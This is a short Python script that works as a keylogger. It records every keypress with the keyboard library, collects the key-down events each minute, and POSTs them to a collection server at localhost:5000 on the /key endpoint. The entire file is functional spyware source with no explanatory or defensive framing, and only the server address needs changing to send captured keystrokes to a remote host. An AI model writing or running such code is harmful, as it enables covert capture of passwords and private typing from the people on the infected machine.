import keyboard
import requests as rq
import socket
from time import time
import threading

ip = socket.gethostbyname(socket.gethostname())
server = "http://localhost:5000"

def sendKeyLog(record):
    recordlist = ""
    for item in record:
        if item.event_type == "down":
            recordlist += item.name
    rs = rq.post(server + "/key", recordlist.encode('utf-8'))

def main():
    count = 0
    ts = time()
    keyboard.start_recording()
    while True:
        dt = time()
        if dt - ts > 60:
            record = keyboard.stop_recording()
            sendKeyLog(record)
            ts = time()
            keyboard.start_recording()
            
        
if __name__=="__main__":
    main()
